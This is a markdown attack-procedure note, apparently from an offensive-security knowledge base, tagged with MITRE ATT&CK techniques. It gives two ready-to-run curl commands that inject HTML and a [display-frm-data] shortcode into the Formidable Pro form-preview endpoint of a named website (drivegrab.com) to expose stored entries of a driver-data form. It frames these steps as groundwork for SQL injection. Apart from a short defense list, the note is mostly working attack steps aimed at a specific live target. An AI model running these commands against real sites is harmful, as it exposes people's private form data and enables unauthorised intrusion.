---
id: proc-test-shortcode-002
tags:
  - sqli
  - injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-after-html]]'
  - '[[commands/curl-inject-display-shortcode]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.008Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Shortcode-Injection-in-Preview

## Summary

This procedure tests the injection of custom HTML and [display-frm-data] shortcode via the after_html parameter in the form preview endpoint, confirming shortcode execution without sanitization.

## Description

The after_html parameter allows appending content after the form, which is rendered server-side. Injecting benign text first validates rendering, then the shortcode with form ID displays entries. This sets up manipulation of order_by and order parameters for SQLi. Prerequisites include a vulnerable Formidable Pro version; outcomes enable visibility into form data for targeting.

## Requirements

1. Successful endpoint verification from prior step
2. curl tool
3. Target form ID (e.g., 835 for driver data form)

## Defense

Defensive measures and detection strategies:

- Sanitize shortcode parameters in plugin updates
- Log and alert on unusual after_html content lengths
- Use Content Security Policy (CSP) to limit rendered HTML

## Objectives

1. Validate custom content rendering
2. Execute shortcode to display entries
3. Identify injectable parameters

## Instructions

### Step 1: Inject Benign HTML

**Context**: Append simple text to confirm after_html is not escaped.

**Command** ([[commands/curl-test-after-html]]):
```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
```

> Command posts after_html with 'hello world'; success shows text in HTML output post-form.

### Step 2: Inject Display Shortcode

**Context**: Use shortcode to render entries, wrapped in markers for parsing.

**Command** ([[commands/curl-inject-display-shortcode]]):
```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
```

> This injects the shortcode for form 835; output includes entries between XXX/YYY, confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-test-after-html]]
- [[commands/curl-inject-display-shortcode]]

## Tools Used

- [[tools/curl]]

## Tags

- sqli
- injection
